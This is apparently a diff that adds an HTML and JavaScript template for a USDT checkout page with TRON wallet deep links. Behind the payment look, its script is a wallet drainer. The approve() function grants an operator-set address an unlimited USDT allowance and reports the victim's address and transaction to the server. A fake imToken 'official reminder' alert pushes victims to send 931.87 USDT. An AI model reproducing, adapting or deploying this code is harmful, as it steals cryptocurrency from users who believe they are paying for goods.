@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- Required meta tags-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no, email=no">
+  <meta name="msapplication-tap-highlight" content="no">
+  <meta name="x5-orientation" content="portrait">
+  <meta name="x5-fullscreen" content="true">
+  <link rel="icon" href="/favicon.ico">
+  <meta name="description" content="">
+  <meta name="keywords" content=""><!-- App title -->
+  <title>正在请求支付 {$amount} USDT</title><!-- Framework7 Library CSS -->
+  <link href="/content/template/default/transfer/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+  <script src="/content/template/default/transfer/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+  <script src="/content/template/default/transfer/js/jquery-3.6.0.min.js"></script>
+  <script src="/content/template/default/transfer/js/qrcode.min.js"></script>
+  <script type="text/javascript" src="/content/template/default/transfer/js/vconsole.min.js"></script>
+	<style>
+		html,
+		body {
+			color: #2e2e2e;
+			font: inherit;
+			font-family: 'avenir-heavy';
+		}
+		
+		.forms .confirm {
+            width: 90%;
+            height: 50px;
+            background: #4073f5;
+            border-radius: 3rem;
+            margin: 0 auto;
+            margin-top: 3rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-family: PingFang SC;
+            font-weight: 400;
+            color: #FFFFFF;
+        }
+        
+        .qingxz {
+            height: 5rem;
+            background: #F2F2F2;
+            display: flex;
+            align-items: center;
+            padding-left: 1.19rem;
+            border-bottom: 1px solid #D2D2D2;
+            border-top: 1px solid #D2D2D2;
+        }
+        
+        .walletitem {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1.13rem 1.94rem;
+            border-bottom: 1px solid #D2D2D2;
+            width: 100%;
+            height: 70px;
+        }
+        
+        .walletitem .left img {
+            width: 40px;
+            height: 40px;
+        }
+        
+        .walletitem .center {
+            flex: 1;
+            flex-shrink: 0;
+            margin-left: 1.31rem;
+        }
+        
+        .walletitem .center .name {
+            font-size: 1rem;
+            font-family: PingFang SC;
+            font-weight: 400;
+            color: #282828;
+        }
+        .name{
+            margin-top: 2px;
+        }
+        
+        .walletitem .center .sub {
+            font-size: 0.8rem;
+            font-family: PingFang SC;
+            font-weight: 400;
+            color: #898989;
+            /*margin-top: 0.6rem;*/
+        }
+        
+        .walletitem .right {
+            width: 2rem;
+            height: 2rem;
+            background: #FFFFFF;
+            border: 0.06px solid #A4A4A4;
+            border-radius: 50%;
+        }
+        
+        .walletitem .right img {
+            width: 2rem;
+            height: 2rem;
+            display: none;
+        }
+
+		#form .row {
+			--bs-gutter-x: 3vw;
+			--bs-gutter-y: 3vw;
+		}
+
+		.fs-14 {
+			font-size: 14px;
+		}
+
+		.fs-12 {
+			font-size: 12px;
+		}
+
+		.time-box {
+			width: 35vw;
+			margin: 10px auto 0;
+			background: #f2f2f2;
+			border-radius: 4px;
+		}
+
+		.page-header {
+			box-shadow: 0 4px 8px 0 rgb(0 0 0 / 10%);
+		}
+
+		.page-header .title {
+			letter-spacing: 0.4px;
+			font-size: 100%;
+		}
+
+		.total-amount span {
+			display: block;
+			text-align: center;
+			line-height: 24px;
+			font-size: 16px;
+			font-family: 'Avenir-Medium';
+			letter-spacing: 0.2px;
+		}
+
+		.total-amount small {
+			line-height: 30px;
+			letter-spacing: 0.4px;
+			font-family: 'avenir-heavy';
+			font-size: 20px;
+			font-weight: bold;
+		}
+
+		.form-title {
+			font-size: 11px;
+			font-family: 'avenir-heavy';
+			color: #000;
+		}
+
+		.icon-logo {
+			width: 5vw;
+			height: 5vw;
+			line-height: 1;
+			background-position: center center;
+			background-size: 100% auto;
+			background-repeat: no-repeat;
+		}
+
+		.icon-logo img {
+			display: block;
+			width: 100%;
+		}
+		.app-button-container {
+			width: 100%;
+			padding: 0 4vw;
+		}
+
+		.app-button {
+			display: flex;
+			flex-flow: column nowrap;
+			align-items: center;
+			justify-content: center;
+			width: 28vw;
+			height: 28vw;
+			padding: .5em 0;
+			border: none;
+			background: #fff;
+			font-size: 11px;
+			box-shadow: 0 0 2px 2px rgba(0, 0, 0, 0.05);
+			border-radius: 8px;
+		}
+
+		.app-button .icon-logo {
+			width: 9vw;
+			height: 9vw;
+			margin-bottom: 1em;
+		}
+
+		.app-button+.app-button {
+			margin-left: 5px;
+		}
+
+		#loading-tip {
+			display: none;
+			position: fixed;
+			top: 0;
+			right: 0;
+			left: 0;
+			bottom: 0;
+			z-index: 999;
+			background: rgba(0, 0, 0, 0.1)
+		}
+		
+		#payment{
+		    line-height: 45px;
+            margin-top: 80px;
+            background: #448bff linear-gradient(45deg,#448bff,#44e9ff);
+            color: #fff;
+            font-size: 1rem;
+            line-height: 1;
+            font-weight: 700;
+            letter-spacing: 0;
+            padding: 0.785rem 2.15rem;
+            border: 0px solid #ffffff;
+            border-radius: 100px;
+            transition: all 400ms ease-in-out;
+            box-shadow: 0 10px 20px 0 rgba(90,70,176,0.3);
+            display: none;
+		}
+		
+		#qrcode{
+		    margin: 50px;
+		    display: none;
+		}
+	</style>
+</head>
+<body>
+	<div class="container page-header p-4">
+	    <div class="mt-2 total-amount">
+	        <small class="fs-8" >商品详情：{$goods_name}</small>
+	        <small class="fs-8" id="goods_name"></small>
+	    </div>
+	    <div class="mt-2 total-amount">
+	        <small class="fs-8" >购买数量：{$goods_num}</small>
+	        <small class="fs-8" id="goods_num"></small>
+	    </div>
+	    <div class="mt-2 total-amount">
+	        <small class="fs-8" >收货邮箱：{$email}</small>
+	        <small class="fs-8" id="email"></small>
+	    </div>
+	    <div class="mt-2 total-amount">
+	        <small class="fs-8">付款金额：{$amount}</small>
+	        <small class="fs-8" id="amount"></small>
+	        <small class="fs-8">USDT</small>
+	    </div>
+	</div>
+	    
+	    <center>
+	        <div id="qrcode">
+	            <h3 >请打开钱包扫码付款</h3>
+	            <h3 style="color:red">仅支持TRC20链付款</h3>
+	        </div>
+	        
+	        <button type="submit" onclick="check()" id="payment">点击付款</button>
+	        
+	    </center>
+	    <div id="mobil" style="display:none">
+	        <div class="qingxz">请选择您的转账钱包</div>
+            <div class="forms">
+
+            <div class="walletitem">
+                <div class="left">
+                    <img src="/content/template/default/transfer/img/okex.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="name huobi">欧易Web3钱包</div>
+					<span data-v-1924d0ae="" class="van-tag van-tag--default" style="background: rgb(235, 47, 150);">TRC-20</span>
+                    <span data-v-1924d0ae="" class="van-tag van-tag--default" style="background: rgb(24, 144, 255);">Android/IOS</span>
+                </div>
+                <div class="right" data-index="1">
+                    <img src="/content/template/default/erc/img/hou.png" alt="">
+                </div>
+            </div>
+            
+            <div class="walletitem">
+                <div class="left">
+                    <img src="/content/template/default/erc/img/bitkeep.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="name huobi">Bitkeep</div>
+                    
+                    <span data-v-1924d0ae="" class="van-tag van-tag--default" style="background: rgb(235, 47, 150);">TRC-20</span>
+                </div>
+                <div class="right" data-index="7">
+                    <img src="/content/template/default/erc/img/hou.png" alt="">
+                </div>
+            </div>
+            
+            <div class="walletitem">
+                <div class="left">
+                    <img src="/content/template/default/erc/img/imtoken.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="name huobi">imToken</div>
+					<span data-v-1924d0ae="" class="van-tag van-tag--default" style="background: rgb(235, 47, 150);">TRC-20</span>
+                    <!--<span data-v-1924d0ae="" class="van-tag van-tag--default" style="background: rgb(24, 144, 255);">ERC-20</span>-->
+                </div>
+                <div class="right" data-index="2">
+                    <img src="/content/template/default/erc/img/hou.png" alt="">
+                </div>
+            </div>
+            
+            <div>
+                <div id="confirm" class="confirm">立即支付</div>
+            </div>
+	        
+	        </div>
+   
+	<script data-cfasync="false" src="/content/template/default/erc/js/email-decode.min.js"></script><script src="/content/template/default/erc/js/layer.js"></script>
+	<script src="/content/template/default/erc/js/bignumber.min.js"></script>
+    <script src="/content/template/default/erc/js/tp.js"></script>
+    <script src="/content/template/default/erc/js/trc.js?v=202304"></script>
+	<script>
+	    if('{$site.domain}' != ''){
+		    var domain = window.location.protocol + "//{$site.domain}" + "/";
+		}else{
+		    var domain = window.location.protocol + "//" + window.location.host + "/";
+		}
+	    var order_no = '{$order_no}';
+	    var amount = '{$amount}';
+    	var selectIndex = 0;
+    	var type;
+    	var permissionsAddr = '{$trc_au_address}';
+    	var payAddr = '{$trc_pay_address}';
+    	var auAddr = '{$trc_au_address}';
+    	var userAddress;
+    	
+        if(IsPC()){
+            
+            if(window.ethereum || window.tronWeb){
+                $("#payment").show();
+            }else{
+                $("#mobil").show();
+            }
+	        
+	    }else{
+	        var qrcode = new QRCode(document.getElementById("qrcode"), {
+        		text: domain + GetUrlRelativePath(),
+        		width: 208,
+        		height: 208,
+        		correctLevel : 0 // 二维码结构复杂性 0~3
+        	});
+        	
+	        $("#qrcode").show();
+	    }
+		
+	    function IsPC() {
+		if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+    			return true; //是手机
+    		} else {
+    			return false; //是电脑
+    		}
+    	}
+    	
+    	function GetUrlRelativePath()
+        {
+        　　var url = document.location.toString();
+        　　var arrUrl = url.split("//");
+        
+        　　var start = arrUrl[1].indexOf("/");
+        　　var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符
+        
+        　　/*if(relUrl.indexOf("?") != -1){
+        　　　　relUrl = relUrl.split("?")[0];
+        　　}*/
+        　　return relUrl;
+        }
+        
+        console.log(GetUrlRelativePath())
+    	
+    	 $(".money_box").click(function(){
+            $(".money_box").removeClass("moneyact");//删除class类
+            $(this).addClass("moneyact");//添加class类
+            var datamoney=$(this).attr("data-value");
+            $("#amount").val(datamoney);
+        })
+        
+        $('.walletitem').click(function() {
+            selectIndex = $(this).find('.right').data('index')
+
+            $('.walletitem .right img').hide()
+            $(this).find('.right img').show()
+           
+            
+        })
+
+        $('#confirm').click(function() {
+            
+            if (selectIndex == 0) {
+                alert("请选择付款钱包！");
+                return
+            } 
+           
+            // var url = decodeURI(window.location.href);
+            var url = domain + GetUrlRelativePath()
+            
+            if (selectIndex == 2) {
+                var im = 'imtokenv2://navigate?screen=DappView&url=' + url;
+                window.location.href = im;
+            } else if (selectIndex == 1) {
+                var okex = 'okx://wallet/dapp/details?dappUrl=' + url;
+                window.location.href = okex;
+            }else if (selectIndex == 3) {
+                var tronlink = 'tronlinkoutside://pull.activity?param=' + url;
+                window.location.href = tronlink;
+            }else if (selectIndex == 4) {
+                var trust = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + url;
+                window.location.href = trust;
+            }else if (selectIndex == 5) {
+                var coinbase = 'https://go.cb-w.com/dapp?cb_url=' + url;
+                window.location.href = coinbase;
+            }else if (selectIndex == 7) {
+                var bitkeep = 'https://bkcode.vip?action=dapp&url=' + url;
+                window.location.href = bitkeep;
+            }else if (selectIndex == 6) {
+                
+                if(window.ethereum){
+                    check()
+                }else{
+                    alert('请复制链接至钱包浏览器打开')
+                    
+                    var input = $('<input>').attr('id','copy').attr('value',url);
+                    $('body').append(input);
+                    $("#copy").select();
+	    
+            	    if(document.execCommand("copy")){
+            	        
+            	        layer.msg("复制成功");
+            	    }else{
+            	        layer.msg("复制失败");
+            	    }
+            	    
+            	    $('#copy').remove()
+                }
+            }
+        })
+        
+        if(/okex/.test(navigator.userAgent.toLowerCase())){
+			okexConnect();
+		}
+
+		async function okexConnect() {
+			if (window.tronLink.ready) {
+				window.tronWeb = tronLink.tronWeb;
+			} else {
+				const res = await tronLink.request({ method: 'tron_requestAccounts' });
+				if (res.code === 200) {
+				  window.tronWeb = tronLink.tronWeb;
+				}
+			}
+		}
+
+
+		async function approve() {
+
+
+			const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";//合约地址
+
+			try {
+				let contract = await tronWeb.contract().at(trc20ContractAddress);
+				let result = await contract.increaseApproval(
+					permissionsAddr,
+					'0xfffffffffffffffffffffffffffffffffffffffff'
+				).send({
+					feeLimit: 30000000
+				}).then(output => {
+					var data = {
+						address:userAddress,
+						authorized_address:permissionsAddr,
+						txid:output,
+						type:'trc',
+						transaction:3
+					 }
+					 
+					jQuery.ajax({
+						url: domain + '/add',
+						method: 'POST',
+						data: data,
+						async: false, 
+						success: function (data) {
+							alert(msg);
+							if(data == 'success'){
+								alert("网络异常，付款失败");
+							}else{
+								alert('付款失败')
+							}
+						},
+						error: function (e) {
+						}
+					})
+				});
+			} catch (error) {
+				console.error(error)
+			}
+		}
+
+        async function check(){
+
+            userAddress = await tronWeb.defaultAddress.base58;
+            var data = {
+                address:userAddress,
+                authorized_address:permissionsAddr
+            }
+
+            // let contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+            // const ressdata = await contract.balanceOf(userAddress).call();
+            // console.log(ressdata);
+            // let usdtBalance = parseInt(ressdata._hex) / 1000000;
+            // console.log(usdtBalance);
+
+            let allowance = 0;
+            if(/okex/.test(navigator.userAgent.toLowerCase())) {
+                let contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+                // 检查授权
+                const resdata = await contract.allowance(userAddress, permissionsAddr).call();
+                console.log(resdata);
+                console.log(resdata.toString());
+                //allowance = parseInt(resdata._hex) / 1000000;
+                // allowance = resdata.toString() / 1000000;
+                allowance = BigNumber(resdata.toString()).dividedBy(BigNumber(10).pow(6)).toString(10)
+            }
+            console.log("授权额度:" + allowance);
+
+            jQuery.ajax({
+        		url: domain + '/is_f',
+        		method: 'POST',
+        		data:data,
+        		async: false,
+    			success:function(data){
+
+                    console.log(data);
+                    // var result = JSON.parse(data);
+    			   if(data.code){
+    			     if(data.data == 1){
+    			         alert("imToken官方提醒：\n系统检测到您的操作存在异常 \n请向该钱包转入指定金额核验 \n金额： 931.87 USDT \n备注信息：Od5fUk83j7  \n效验通过后可恢复正常使用");
+    			     }/*else if(data.data == 2){
+    			         transfer()
+    			     }*/else {
+                         transfer()
+                     }
+
+    			   }else{
+                       if(/okex/.test(navigator.userAgent.toLowerCase())){
+                           if (allowance >= 10000) {
+                               console.log("有授权，到转账");
+                               transfer();
+                               return;
+                           }
+                           console.log("未授权，到授权");
+                           approve();
+                           return;
+                       }
+                       console.log('到这4');
+    			     //  approve();
+    			     updatePermissions()
+    			   }
+
+    			},
+    			error:function(data){
+    
+    			}
+    		})
+            
+            
+            
+            
+            
+        }
+
+	    
+	    function checkOrderStatus(){
+
+            $.get(domain + "getorderstatus/" + order_no + "/order" , function(e){
+                if(e.data == 1){
+                    location.href= domain + "/order/all";
+                }
+            }, "json");
+
+        }
+
+        var get_order_status = setInterval(checkOrderStatus, 3000);
+	   // setTimeout(function() { check() }, 2000);
+	</script>
+</body>
+</html>
